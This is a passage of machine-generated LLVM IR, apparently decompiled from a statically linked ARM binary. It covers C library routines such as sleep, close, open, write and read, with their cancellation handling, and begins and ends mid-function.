  uselistorder i32 %v0_16130, { 2, 0, 1 }
  uselistorder i32 %v3_160e8, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 11, 3, 4, 5, 6, 7, 0, 8, 1, 9, 2, 10 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_161a8, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_16154, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_161c0 = load i32, i32* @r4, align 4
  %v6_161c0 = load i32, i32* @r5, align 4
  %v9_161c0 = load i32, i32* @r6, align 4
  %v12_161c0 = load i32, i32* @r7, align 4
  %v15_161c0 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161d0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_161d0, label %dec_label_pc_161e4, label %dec_label_pc_16258

dec_label_pc_161e4:                               ; preds = %entry
  %v0_161e4 = call i32 @__aeabi_read_tp()
  %v1_161e8 = add i32 %v0_161e4, -1036
  %v2_161e8 = inttoptr i32 %v1_161e8 to i32*
  %v3_161e8 = load i32, i32* %v2_161e8, align 4
  %v1_161ec = and i32 %v3_161e8, -71
  %v2_161f0 = icmp ugt i32 %v1_161ec, 7
  store i1 %v2_161f0, i1* %cpsr_c.global-to-local, align 1
  %v7_161f0 = icmp eq i32 %v1_161ec, 8
  %v1_161f4 = add i32 %v0_161e4, -1168
  store i32 %v1_161f4, i32* @r5, align 4
  br i1 %v7_161f0, label %dec_label_pc_161fc, label %dec_label_pc_162d0

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161e4
  %v2_16200 = add i32 %v0_161e4, -624
  %v3_16200 = inttoptr i32 %v2_16200 to i32*
  store i32 -1, i32* %v3_16200, align 4
  %v0_16204 = load i32, i32* @r5, align 4
  %v1_16204 = add i32 %v0_16204, 132
  store i32 %v1_16204, i32* @r6, align 4
  br label %dec_label_pc_16208

dec_label_pc_16208:                               ; preds = %dec_label_pc_1623c.dec_label_pc_16208_crit_edge, %dec_label_pc_161fc
  %v0_1620c = phi i32 [ %v0_1620c.pre, %dec_label_pc_1623c.dec_label_pc_16208_crit_edge ], [ %v1_16204, %dec_label_pc_161fc ]
  %v0_16208 = phi i32 [ %v0_16244, %dec_label_pc_1623c.dec_label_pc_16208_crit_edge ], [ %v0_16204, %dec_label_pc_161fc ]
  %v1_16208 = add i32 %v0_16208, 132
  %v2_16208 = inttoptr i32 %v1_16208 to i32*
  %v3_16208 = load i32, i32* %v2_16208, align 4
  store i32 %v0_1620c, i32* %r2.global-to-local, align 4
  store i32 %v3_16208, i32* @r4, align 4
  %v1_1621830 = inttoptr i32 %v0_1620c to i32*
  %v2_1621831 = load i32, i32* %v1_1621830, align 4
  %v3_1621c33 = icmp uge i32 %v2_1621831, %v3_16208
  store i1 %v3_1621c33, i1* %cpsr_c.global-to-local, align 1
  %v9_1621c39 = icmp eq i32 %v2_1621831, %v3_16208
  br i1 %v9_1621c39, label %dec_label_pc_16224, label %dec_label_pc_1623c

dec_label_pc_16224:                               ; preds = %dec_label_pc_16208, %dec_label_pc_16224.dec_label_pc_16218_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_16234 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16234, label %dec_label_pc_16238, label %dec_label_pc_16224.dec_label_pc_16218_crit_edge

dec_label_pc_16224.dec_label_pc_16218_crit_edge:  ; preds = %dec_label_pc_16224
  %v0_16218.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1621c.pre = load i32, i32* @r4, align 4
  %v1_16218 = inttoptr i32 %v0_16218.pre to i32*
  %v2_16218 = load i32, i32* %v1_16218, align 4
  %v3_1621c = icmp uge i32 %v2_16218, %v1_1621c.pre
  store i1 %v3_1621c, i1* %cpsr_c.global-to-local, align 1
  %v9_1621c = icmp eq i32 %v2_16218, %v1_1621c.pre
  br i1 %v9_1621c, label %dec_label_pc_16224, label %dec_label_pc_1623c

dec_label_pc_16238:                               ; preds = %dec_label_pc_16224
  %v0_16238 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %dec_label_pc_16208, %dec_label_pc_16224.dec_label_pc_16218_crit_edge, %dec_label_pc_16238
  %v0_1623c = phi i32 [ %v0_16238, %dec_label_pc_16238 ], [ %v2_1621831, %dec_label_pc_16208 ], [ %v2_16218, %dec_label_pc_16224.dec_label_pc_16218_crit_edge ]
  %v1_1623c = phi i32 [ %v0_16238, %dec_label_pc_16238 ], [ %v3_16208, %dec_label_pc_16208 ], [ %v1_1621c.pre, %dec_label_pc_16224.dec_label_pc_16218_crit_edge ]
  %v3_1623c = icmp uge i32 %v0_1623c, %v1_1623c
  store i1 %v3_1623c, i1* %cpsr_c.global-to-local, align 1
  %v9_1623c = icmp eq i32 %v0_1623c, %v1_1623c
  br i1 %v9_1623c, label %dec_label_pc_16244, label %dec_label_pc_1623c.dec_label_pc_16208_crit_edge

dec_label_pc_1623c.dec_label_pc_16208_crit_edge:  ; preds = %dec_label_pc_1623c
  %v0_16244 = load i32, i32* @r5, align 4
  %v0_1620c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16208

dec_label_pc_16244:                               ; preds = %dec_label_pc_1623c
  %v0_1624c = load i32, i32* @r7, align 4
  %v2_1624c = add i32 %v0_1624c, 116
  %v3_1624c = inttoptr i32 %v2_1624c to i32*
  %v4_1624c = load i32, i32* %v3_1624c, align 4
  store i32 90712, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1624c)
  %v0_16260.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16258

dec_label_pc_16258:                               ; preds = %entry, %dec_label_pc_16244
  %v0_16260 = phi i32 [ 0, %entry ], [ %v0_16260.pre, %dec_label_pc_16244 ]
  %v2_16264 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_16264, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_16270 = call i32 @__libc_sigaction(i32 17, i32 %v0_16260, i32 %v2_16264)
  %v3_16274 = load i32, i32* %stack_var_-60, align 4
  %v2_16278 = icmp ne i32 %v3_16274, 0
  store i1 %v2_16278, i1* %cpsr_c.global-to-local, align 1
  %v7_16278 = icmp eq i32 %v3_16274, 1
  br i1 %v7_16278, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16258
  %v3_1627c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1627c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16258, %bb
  call void @__pseudo_cond_branch(i1 %v7_16278, i32 ptrtoint (i32* @global_var_13130.937 to i32))
  %v2_1628c = ptrtoint i32* %stack_var_-32 to i32
  %v2_16294 = call i32 @__libc_nanosleep(i32 %v2_1628c, i32 %v2_1628c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16298 = icmp eq i32 %v2_16294, 0
  br i1 %v2_16298, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_162ac = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_162ac, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_162bc = load i32, i32* %stack_var_-40, align 4
  %v1_162c0 = and i32 %v3_162bc, 65536
  store i32 %v1_162c0, i32* %r2.global-to-local, align 4
  %v2_162c0 = icmp eq i32 %v1_162c0, 0
  br i1 %v2_162c0, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_162c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_162c8, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_162c0, i32 ptrtoint (i32* @global_var_13130.937 to i32))
  br label %dec_label_pc_162d0

dec_label_pc_162d0:                               ; preds = %dec_label_pc_161e4, %.thread5
  %v0_162d0 = load i32, i32* @r4, align 4
  store i32 %v3_161c0, i32* @r4, align 4
  store i32 %v6_161c0, i32* @r5, align 4
  store i32 %v9_161c0, i32* @r6, align 4
  store i32 %v12_161c0, i32* @r7, align 4
  store i32 %v15_161c0, i32* @lr, align 4
  ret i32 %v0_162d0

; uselistorder directives
  uselistorder i32 %v0_16238, { 1, 0 }
  uselistorder i32 %v1_1621c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_162d0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_16258, { 1, 0 }
  uselistorder label %dec_label_pc_1623c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16224, { 1, 0 }
}

define i32 @function_162e4(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_162e4:
  %v0_162e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_162e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_162e4
  %v2_162e4 = load i32, i32* @r4, align 4
  %v4_162e4 = lshr i32 %v2_162e4, %arg1
  %v5_162e4 = sub i32 32, %arg1
  %v6_162e4 = shl i32 %v2_162e4, %v5_162e4
  %v7_162e4 = or i32 %v6_162e4, %v4_162e4
  %v9_162e4 = and i32 %v7_162e4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162e4, %bb
  %v11_162f0 = phi i32 [ %arg1, %dec_label_pc_162e4 ], [ %v9_162e4, %bb ]
  ret i32 %v11_162f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_16304 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16304, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16304 = load i32, i32* @r0, align 4
  ret i32 %v2_16304

bb1:                                              ; preds = %entry
  %v0_16308 = call i32 @__syscall_error()
  ret i32 %v0_16308
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16314 = load i32, i32* @global_var_276ec.940, align 4
  %v2_16318 = icmp eq i32 %v3_16314, 0
  store i1 %v2_16318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16318, label %dec_label_pc_16320, label %entry.dec_label_pc_1633c_crit_edge

entry.dec_label_pc_1633c_crit_edge:               ; preds = %entry
  %v3_1633c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1633c

dec_label_pc_16320:                               ; preds = %entry
  %v0_16320 = load i32, i32* @r7, align 4
  store i32 %v0_16320, i32* @ip, align 4
  %v0_16330 = load i32, i32* @r0, align 4
  %v2_16330 = icmp ugt i32 %v0_16330, -4097
  %v7_16330 = icmp eq i32 %v0_16330, -4096
  store i1 %v7_16330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16330, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1633c, %bb8, %bb9, %dec_label_pc_16320
  %merge2 = phi i32 [ %v0_16330, %dec_label_pc_16320 ], [ %v0_16360, %dec_label_pc_1633c ], [ %v0_16370, %bb8 ], [ %v0_16370, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_16320
  %v0_16338 = call i32 @__syscall_error()
  br label %dec_label_pc_1633c

dec_label_pc_1633c:                               ; preds = %entry.dec_label_pc_1633c_crit_edge, %bb7
  %v3_1633c = phi i32 [ %v3_1633c.pre, %entry.dec_label_pc_1633c_crit_edge ], [ %v0_16338, %bb7 ]
  %v9_1633c = load i32, i32* @r7, align 4
  store i32 %v9_1633c, i32* %stack_var_-8, align 4
  %v12_1633c = load i32, i32* @lr, align 4
  %v0_16340 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16340, i32* @ip, align 4
  store i32 %v3_1633c, i32* @r7, align 4
  %v1_1635c = call i32 @__libc_disable_asynccancel(i32 %v0_16340)
  %v0_16360 = load i32, i32* @r7, align 4
  store i32 %v0_16360, i32* @r0, align 4
  %v2_16364 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16364, i32* @r7, align 4
  store i32 %v12_1633c, i32* @lr, align 4
  %v2_16368 = icmp ugt i32 %v0_16360, -4097
  %v7_16368 = icmp eq i32 %v0_16360, -4096
  store i1 %v7_16368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16368, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1633c
  %v0_16370 = call i32 @__syscall_error()
  %v0_16380 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16380, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_16380 = load i32, i32* @r1, align 4
  %v5_16380 = sdiv i32 %v0_16370, 64
  %v6_16380 = and i32 %v1_16380, %v5_16380
  store i32 %v6_16380, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16370, { 0, 2, 1 }
  uselistorder i32 %v0_16360, { 0, 2, 3, 1 }
  uselistorder i32 %v0_16330, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1633c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_16394 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16394, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16394 = load i32, i32* @r0, align 4
  ret i32 %v2_16394

bb1:                                              ; preds = %entry
  %v0_16398 = call i32 @__syscall_error()
  ret i32 %v0_16398
}

define i32 @__libc_open(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_163a4 = load i32, i32* @global_var_276ec.940, align 4
  %v2_163a8 = icmp eq i32 %v3_163a4, 0
  store i1 %v2_163a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163a8, label %dec_label_pc_163b0, label %entry.dec_label_pc_163cc_crit_edge

entry.dec_label_pc_163cc_crit_edge:               ; preds = %entry
  %v3_163cc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_163cc

dec_label_pc_163b0:                               ; preds = %entry
  %v0_163c0 = load i32, i32* @r0, align 4
  %v2_163c0 = icmp ugt i32 %v0_163c0, -4097
  %v7_163c0 = icmp eq i32 %v0_163c0, -4096
  store i1 %v7_163c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163c0, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_163cc, %bb11, %bb12, %dec_label_pc_163b0
  %merge2 = phi i32 [ %v0_163c0, %dec_label_pc_163b0 ], [ %v0_163f0, %dec_label_pc_163cc ], [ %v0_16400, %bb11 ], [ %v0_16400, %bb12 ]
  ret i32 %merge2

bb10:                                             ; preds = %dec_label_pc_163b0
  %v0_163c8 = call i32 @__syscall_error()
  br label %dec_label_pc_163cc

dec_label_pc_163cc:                               ; preds = %entry.dec_label_pc_163cc_crit_edge, %bb10
  %v3_163cc = phi i32 [ %v3_163cc.pre, %entry.dec_label_pc_163cc_crit_edge ], [ %v0_163c8, %bb10 ]
  store i32 %v3_163cc, i32* %stack_var_-24, align 4
  %v12_163cc = load i32, i32* @r2, align 4
  %v15_163cc = load i32, i32* @r3, align 4
  %v18_163cc = load i32, i32* @r7, align 4
  store i32 %v18_163cc, i32* %stack_var_-8, align 4
  %v21_163cc = load i32, i32* @lr, align 4
  %v0_163d0 = call i32 @__libc_enable_asynccancel()
  %v2_163d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v12_163cc, i32* @r2, align 4
  store i32 %v15_163cc, i32* @r3, align 4
  store i32 %v2_163d8, i32* @r7, align 4
  %v1_163ec = call i32 @__libc_disable_asynccancel(i32 %v0_163d0)
  %v0_163f0 = load i32, i32* @r7, align 4
  store i32 %v0_163f0, i32* @r0, align 4
  %v2_163f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163f4, i32* @r7, align 4
  store i32 %v21_163cc, i32* @lr, align 4
  %v2_163f8 = icmp ugt i32 %v0_163f0, -4097
  %v7_163f8 = icmp eq i32 %v0_163f0, -4096
  store i1 %v7_163f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163f8, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_163cc
  %v0_16400 = call i32 @__syscall_error()
  %v0_16410 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16410, label %bb12, label %bb

bb12:                                             ; preds = %bb11
  %v1_16410 = load i32, i32* @r1, align 4
  %v2_16410 = trunc i32 %v1_16410 to i16
  %v4_16410 = inttoptr i32 %v1_16410 to i16*
  store i16 %v2_16410, i16* %v4_16410, align 2
  %v6_16410 = load i32, i32* @r1, align 4
  %v7_16410 = sub i32 %v6_16410, %v0_16400
  store i32 %v7_16410, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16400, { 2, 1, 0 }
  uselistorder i32 %v0_163f0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_163c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163cc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_16424 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16424, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16424 = load i32, i32* @r0, align 4
  ret i32 %v2_16424

bb1:                                              ; preds = %entry
  %v0_16428 = call i32 @__syscall_error()
  ret i32 %v0_16428
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16434 = load i32, i32* @global_var_276ec.940, align 4
  %v2_16438 = icmp eq i32 %v3_16434, 0
  store i1 %v2_16438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16438, label %dec_label_pc_16440, label %entry.dec_label_pc_1645c_crit_edge

entry.dec_label_pc_1645c_crit_edge:               ; preds = %entry
  %v3_1645c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1645c

dec_label_pc_16440:                               ; preds = %entry
  %v0_16450 = load i32, i32* @r0, align 4
  %v2_16450 = icmp ugt i32 %v0_16450, -4097
  %v7_16450 = icmp eq i32 %v0_16450, -4096
  store i1 %v7_16450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16450, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_1645c, %bb10, %bb11, %dec_label_pc_16440
  %merge2 = phi i32 [ %v0_16450, %dec_label_pc_16440 ], [ %v0_16480, %dec_label_pc_1645c ], [ %v0_16490, %bb10 ], [ %v0_16490, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_16440
  %v0_16458 = call i32 @__syscall_error()
  br label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %entry.dec_label_pc_1645c_crit_edge, %bb9
  %v3_1645c = phi i32 [ %v3_1645c.pre, %entry.dec_label_pc_1645c_crit_edge ], [ %v0_16458, %bb9 ]
  %v12_1645c = load i32, i32* @r3, align 4
  %v15_1645c = load i32, i32* @r7, align 4
  store i32 %v15_1645c, i32* %stack_var_-8, align 4
  %v18_1645c = load i32, i32* @lr, align 4
  %v0_16460 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1645c, i32* @r3, align 4
  store i32 %v3_1645c, i32* @r7, align 4
  %v1_1647c = call i32 @__libc_disable_asynccancel(i32 %v0_16460)
  %v0_16480 = load i32, i32* @r7, align 4
  store i32 %v0_16480, i32* @r0, align 4
  %v2_16484 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16484, i32* @r7, align 4
  store i32 %v18_1645c, i32* @lr, align 4
  %v2_16488 = icmp ugt i32 %v0_16480, -4097
  %v7_16488 = icmp eq i32 %v0_16480, -4096
  store i1 %v7_16488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16488, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1645c
  %v0_16490 = call i32 @__syscall_error()
  %v0_164a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_164a0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16490, { 1, 0 }
  uselistorder i32 %v0_16480, { 0, 2, 3, 1 }
  uselistorder i32 %v0_16450, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1645c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_164b4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_164b4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_164b4 = load i32, i32* @r0, align 4
  ret i32 %v2_164b4

bb1:                                              ; preds = %entry
  %v0_164b8 = call i32 @__syscall_error()
  ret i32 %v0_164b8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164c4 = load i32, i32* @global_var_276ec.940, align 4
  %v2_164c8 = icmp eq i32 %v3_164c4, 0
  br i1 %v2_164c8, label %dec_label_pc_164d0, label %entry.dec_label_pc_164ec_crit_edge

entry.dec_label_pc_164ec_crit_edge:               ; preds = %entry
  %v3_164ec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_164ec

dec_label_pc_164d0:                               ; preds = %entry
  %v0_164e0 = load i32, i32* @r0, align 4
  %v2_164e0 = icmp ugt i32 %v0_164e0, -4097
  br i1 %v2_164e0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_164ec, %dec_label_pc_164d0
  %merge = phi i32 [ %v0_164e0, %dec_label_pc_164d0 ], [ %v0_16510, %dec_label_pc_164ec ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_164d0
  %v0_164e8 = call i32 @__syscall_error()
  br label %dec_label_pc_164ec

dec_label_pc_164ec:                               ; preds = %entry.dec_label_pc_164ec_crit_edge, %bb8
  %v3_164ec = phi i32 [ %v3_164ec.pre, %entry.dec_label_pc_164ec_crit_edge ], [ %v0_164e8, %bb8 ]
  %v6_164ec = load i32, i32* @r1, align 4
  %v15_164ec = load i32, i32* @r7, align 4
  store i32 %v15_164ec, i32* %stack_var_-8, align 4
  %v18_164ec = load i32, i32* @lr, align 4
  %v0_164f0 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_164ec, i32* @r1, align 4
  store i32 %v3_164ec, i32* @r7, align 4
  %v1_1650c = call i32 @__libc_disable_asynccancel(i32 %v0_164f0)
  %v0_16510 = load i32, i32* @r7, align 4
  store i32 %v0_16510, i32* @r0, align 4
  %v2_16514 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16514, i32* @r7, align 4
  store i32 %v18_164ec, i32* @lr, align 4
  %v2_16518 = icmp ugt i32 %v0_16510, -4097
  br i1 %v2_16518, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_164ec
  %v0_16520 = call i32 @__syscall_error()
  ret i32 %v0_16520

; uselistorder directives
  uselistorder i32 %v0_16510, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_164ec, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_16530 = load i32, i32* %r0.global-to-local, align 4
  %v1_16530 = and i32 %v0_16530, 2
  %v2_16530 = icmp eq i32 %v1_16530, 0
  %v3_16534 = load i32, i32* @r4, align 4
  store i32 %v3_16534, i32* %stack_var_-16, align 4
  br i1 %v2_16530, label %dec_label_pc_1653c, label %dec_label_pc_165b0

dec_label_pc_1653c:                               ; preds = %entry
  %v0_1653c = call i32 @__aeabi_read_tp()
  store i32 %v0_1653c, i32* %r0.global-to-local, align 4
  %v1_16540 = add i32 %v0_1653c, -1036
  %v2_16540 = inttoptr i32 %v1_16540 to i32*
  %v3_16540 = load i32, i32* %v2_16540, align 4
  %v1_16544 = add i32 %v0_1653c, -1168
  store i32 %v1_16544, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_1657c.dec_label_pc_16548_crit_edge, %dec_label_pc_1653c
  %v0_16554 = phi i32 [ %v0_16554.pre, %dec_label_pc_1657c.dec_label_pc_16548_crit_edge ], [ %v1_16544, %dec_label_pc_1653c ]
  %v0_16548 = phi i32 [ %v0_1657c, %dec_label_pc_1657c.dec_label_pc_16548_crit_edge ], [ %v3_16540, %dec_label_pc_1653c ]
  %v1_16548 = and i32 %v0_16548, -3
  store i32 %v1_16548, i32* %r7.global-to-local, align 4
  store i32 %v0_16548, i32* %r4.global-to-local, align 4
  store i32 %v1_16548, i32* @r1, align 4
  %v1_16554 = add i32 %v0_16554, 132
  store i32 %v1_16554, i32* @r2, align 4
  %v1_1655823 = inttoptr i32 %v1_16554 to i32*
  %v2_1655824 = load i32, i32* %v1_1655823, align 4
  %v3_1655c26 = icmp uge i32 %v2_1655824, %v0_16548
  store i1 %v3_1655c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1655c32 = icmp eq i32 %v2_1655824, %v0_16548
  br i1 %v9_1655c32, label %dec_label_pc_16564, label %dec_label_pc_1657c

dec_label_pc_16564:                               ; preds = %dec_label_pc_16548, %dec_label_pc_16564.dec_label_pc_16558_crit_edge
  %v0_1656433 = phi i32 [ %v1_1655c.pre, %dec_label_pc_16564.dec_label_pc_16558_crit_edge ], [ %v0_16548, %dec_label_pc_16548 ]
  store i32 %v0_1656433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16574 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16574, label %dec_label_pc_16578, label %dec_label_pc_16564.dec_label_pc_16558_crit_edge

dec_label_pc_16564.dec_label_pc_16558_crit_edge:  ; preds = %dec_label_pc_16564
  %v0_16558.pre = load i32, i32* @r2, align 4
  %v1_1655c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16558 = inttoptr i32 %v0_16558.pre to i32*
  %v2_16558 = load i32, i32* %v1_16558, align 4
  %v3_1655c = icmp uge i32 %v2_16558, %v1_1655c.pre
  store i1 %v3_1655c, i1* %cpsr_c.global-to-local, align 1
  %v9_1655c = icmp eq i32 %v2_16558, %v1_1655c.pre
  br i1 %v9_1655c, label %dec_label_pc_16564, label %dec_label_pc_1657c

dec_label_pc_16578:                               ; preds = %dec_label_pc_16564
  %v0_16578 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1657c

dec_label_pc_1657c:                               ; preds = %dec_label_pc_16548, %dec_label_pc_16564.dec_label_pc_16558_crit_edge, %dec_label_pc_16578
  %v0_1657c = phi i32 [ %v0_16578, %dec_label_pc_16578 ], [ %v2_1655824, %dec_label_pc_16548 ], [ %v2_16558, %dec_label_pc_16564.dec_label_pc_16558_crit_edge ]
  %v1_1657c = phi i32 [ %v0_16578, %dec_label_pc_16578 ], [ %v0_16548, %dec_label_pc_16548 ], [ %v1_1655c.pre, %dec_label_pc_16564.dec_label_pc_16558_crit_edge ]
  %v3_1657c = icmp uge i32 %v0_1657c, %v1_1657c
  store i1 %v3_1657c, i1* %cpsr_c.global-to-local, align 1
  %v9_1657c = icmp eq i32 %v0_1657c, %v1_1657c
  br i1 %v9_1657c, label %dec_label_pc_165a4.preheader, label %dec_label_pc_1657c.dec_label_pc_16548_crit_edge

